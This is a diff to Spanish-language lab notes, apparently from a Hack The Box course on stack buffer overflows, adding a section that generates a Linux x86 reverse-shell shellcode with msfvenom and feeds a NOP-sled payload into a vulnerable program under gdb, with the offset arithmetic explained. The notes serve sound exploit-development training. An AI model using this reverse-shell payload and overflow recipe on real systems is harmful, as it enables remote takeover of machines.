@@ -170,10 +170,37 @@ Luego, inspeccionamos la memoria para verificar el estado de la secuencia:
 (gdb) x/2000xb $esp+500
 ```
 
-## Interpretación del Volcado
-- La salida muestra la representación en hexadecimal de los bytes en memoria.
-- Se compara el patrón enviado con lo que aparece en la memoria para detectar si algún byte se corrompió o no se insertó correctamente.
-- En nuestro ejemplo, se identificaron como *bad characters* los siguientes bytes:
-  - **\x00\x09\x0a\x20**
-  
-  Esto indica que, al enviarse el payload, estos caracteres no se conservaron o fueron modificados (por ejemplo, debido al procesamiento del input en el programa).
+## Generando ShellCode
+- con msfvenom: `GNT@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>`
+
+```bash
+GNT@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
+
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of c file: 425 bytes
+Saved as: shellcode
+
+
+GNT@htb[/htb]$ cat shellcode
+
+unsigned char buf[] = 
+"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
+"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
+"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
+```
+- Explotando... : `gdb --args ./bow $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xbe\x97\x4c\xf2\x9c\xd9\xf7\xd9\x74\x24\xf4\x5f\x33\xc9\xb1\x12\x83\xc7\x04\x31\x77\x0e\x03\xe0\x42\x10\x69\x3f\x80\x23\x71\x6c\x75\x9f\x1c\x90\xf0\xfe\x51\xf2\xcf\x81\x01\xa3\x7f\xbe\xe8\xd3\xc9\xb8\x0b\xbb\xb6\x3a\xec\x3a\x21\x39\xec\x46\xd8\xb4\x0d\x06\x7c\x97\x9c\x35\x32\x14\x96\x58\xf9\x9b\xfa\xf2\x6c\xb3\x89\x6a\x19\xe4\x42\x08\xb0\x73\x7f\x9e\x11\x0d\x61\xae\x9d\xc0\xe2" + "\x66" * 4')`
+- Llenamos el buffer con el caracter `\x55`, U en ascii.
+    - Lo utilizamos para alcanzar el instruction pointer sin alterar la ejecución.
+- El calculo es así:
+    - Tamaño total del buffer: 1040 bytes.
+    - NOPs: 124 bytes.
+    - Shellcode: 95 bytes.
+    - Dirección EIP: 4 bytes.
+    - Espacio restante 1040-124-95-4=817 bytes
+- `\x90` es el OP-code de la instrucción NOP en x86 assembly.
+- `\x66` es el caracter que se sobreescribirá en el EIP.
+- Entonces ahora si chequeamos los primeros bytes de nuestro shellcode matchean con los bytes luego de los bytes de NOPs.
